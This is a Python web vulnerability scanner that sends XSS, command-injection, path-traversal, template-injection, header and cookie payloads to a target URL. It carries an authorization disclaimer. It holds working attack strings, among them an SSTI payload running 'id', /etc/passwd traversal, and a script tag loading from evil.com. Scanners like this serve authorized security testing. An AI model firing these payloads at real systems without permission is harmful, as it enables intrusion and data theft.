"""
Payload-Based Vulnerability Scanner (Advanced Multi-Vector)

This script tests a given URL for multiple types of injection vulnerabilities:
- XSS (URL params, headers, cookies)
- Command Injection (input fields, URL parameters)
- LFI (path traversal vectors)
- Blind CMD execution detection (via time delay)
- SSTI (Server-Side Template Injection)
- POST-based parameter injection

The scanner injects payloads contextually, based on the target type, and prints results to the terminal.
It also inspects response headers and status codes for anomaly detection.

ðŸš¨ Disclaimer: Use this tool only in environments you are authorized to test.
Unauthorized use against external systems is illegal and unethical.

Author: Bar Cohen
"""

import requests
import time
from urllib.parse import quote

# Payload categories
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=confirm('XSS')>",
    "<video><source onerror='alert(1)'></video>",
    "<object data='javascript:alert(1)'></object>",
    "<script>prompt(document.domain)</script>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<script src='https://evil.com/xss.js'></script>",
    "<link rel=stylesheet href=data:text/css,@import'javascript:alert(1)'>"
]

cmd_payloads = [
    "; whoami",
    "; id",
    "; uname -a",
    "; sleep 5",
    "| whoami",
    "&& whoami",
    "|| whoami"
]

lfi_payloads = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../../../windows/win.ini",
    "/proc/self/environ",
    "../../../../../../dev/null",
    "../../../../../../var/log/apache2/access.log"
]

ssti_payloads = [
    "{{7*7}}",
    "{{config}}",
    "{{request.application}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
]

header_payloads = {
    "User-Agent": "<svg/onload=alert('XSS')>",
    "Referer": "<script>alert(1)</script>",
    "X-Forwarded-For": "127.0.0.1<script>alert(1)</script>",
    "Cookie": "sessionid=xyz; user=admin<script>alert(1)</script>"
}

# Context-aware injection
def scan_url(target_url, param="input"):
    print(f"[+] Scanning: {target_url}\n")

    combined_payloads = xss_payloads + cmd_payloads + lfi_payloads + ssti_payloads
    for payload in combined_payloads:
        encoded = quote(payload)
        if "?" in target_url:
            test_url = f"{target_url}&{param}={encoded}"
        else:
            test_url = f"{target_url}?{param}={encoded}"

        print(f"[*] URL param test: {payload}")
        try:
            start = time.time()
            r = requests.get(test_url, timeout=10)
            duration = time.time() - start

            if payload in r.text or any(k in r.text.lower() for k in ["alert", "root", "whoami", "etc/passwd", "uid", "49"]):
                print(f"[!] Reflected in body â€” Possible vulnerability with: {payload}")
            if payload in str(r.headers):
                print(f"[!] Reflected in headers â€” Possible header manipulation!")
            if r.status_code >= 500:
                print(f"[!] Server error (status {r.status_code}) â€” payload may have triggered exception!")
            if r.status_code == 403:
                print("[!] Access forbidden â€” possible WAF or security control detected")
            if r.url != test_url:
                print(f"[!] Redirected to {r.url} â€” check server-side logic")
            if duration > 4.5:
                print(f"[!] Detected time delay ({duration:.2f}s) â€” potential command execution via sleep")

        except Exception as e:
            print(f"[ERROR] URL test failed: {e}\n")

    # 2. HTTP Header Injection
    print("[+] Testing headers...\n")
    for header, val in header_payloads.items():
        try:
            r = requests.get(target_url, headers={header: val}, timeout=5)
            if val in r.text:
                print(f"[!] Reflected header payload in body: {header}")
            if val in str(r.headers):
                print(f"[!] Reflected in response headers â€” possible header echo!")
        except Exception as e:
            print(f"[ERROR] Header injection failed: {e}\n")

    # 3. Cookie injection
    print("[+] Testing Cookie injection...\n")
    cookies = {"session": "<script>alert('cookie')</script>"}
    try:
        r = requests.get(target_url, cookies=cookies, timeout=5)
        if "<script>alert('cookie')</script>" in r.text:
            print("[!] Cookie reflected in body â€” possible XSS!")
        if "<script>alert('cookie')</script>" in str(r.headers):
            print("[!] Cookie reflected in headers â€” possible leakage!")
    except Exception as e:
        print(f"[ERROR] Cookie test failed: {e}\n")

    # 4. POST parameter injection
    print("[+] Testing POST injection...\n")
    for payload in combined_payloads:
        try:
            data = {param: payload}
            start = time.time()
            r = requests.post(target_url, data=data, timeout=10)
            duration = time.time() - start

            if payload in r.text:
                print(f"[!] Reflected in POST body â€” Possible vulnerability with: {payload}")
            if r.status_code >= 500:
                print(f"[!] Server error on POST ({r.status_code}) â€” payload may have triggered exception!")
            if duration > 4.5:
                print(f"[!] POST delay ({duration:.2f}s) â€” Possible blind CMD injection via POST")

        except Exception as e:
            print(f"[ERROR] POST test failed: {e}\n")

# Run
if __name__ == "__main__":
    target = "http://example.com/test"  # Change to test URL
    scan_url(target)
